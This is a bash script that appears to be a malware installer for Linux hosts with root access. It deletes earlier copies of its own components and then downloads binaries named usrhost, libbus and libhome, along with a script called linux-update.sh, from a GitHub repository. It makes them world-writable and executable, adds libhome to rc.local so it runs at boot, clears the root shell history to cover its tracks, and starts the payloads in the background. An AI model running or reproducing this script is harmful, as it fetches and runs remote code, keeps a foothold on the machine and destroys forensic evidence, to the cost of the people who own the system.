#!/bin/bash
#
#uninstall
sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/linux-update.sh >\/dev\/null 2>&1/d' /etc/crontab
sed -i '\/usr\/bin\/libhome/d' /etc/rc.d/rc.local

killall usrhost
killall libbus
killall libhome

rm -rf /usr/bin/usrhost
rm -rf /usr/bin/libbus
rm -rf /usr/bin/libhome

rm -rf /usr/bin/linux-update.sh
rm -rf /usr/bin/usrhost_ver.txt

#uninstall finish

#my daemon and add autorun
wget https://raw.githubusercontent.com/myvulweb/b2/master/libhome -O /usr/bin/libhome
chmod 777 /usr/bin/libhome
echo '/usr/bin/libhome'>>/etc/rc.d/rc.local

wget https://raw.githubusercontent.com/myvulweb/b2/master/usrhost_ver.txt -O /usr/bin/usrhost_ver.txt
wget https://raw.githubusercontent.com/myvulweb/b2/master/linux-update.sh -O /usr/bin/linux-update.sh
chmod 777 /usr/bin/linux-update.sh
wget https://github.com/myvulweb/b2/raw/master/usrhost -O /usr/bin/usrhost 
chmod 777 /usr/bin/usrhost
wget https://github.com/myvulweb/b2/raw/master/libbus -O /usr/bin/libbus
chmod 777 /usr/bin/libbus

echo >/root/.bash_history
history -c
/usr/bin/usrhost &
/usr/bin/libbus &
/usr/bin/libhome &

 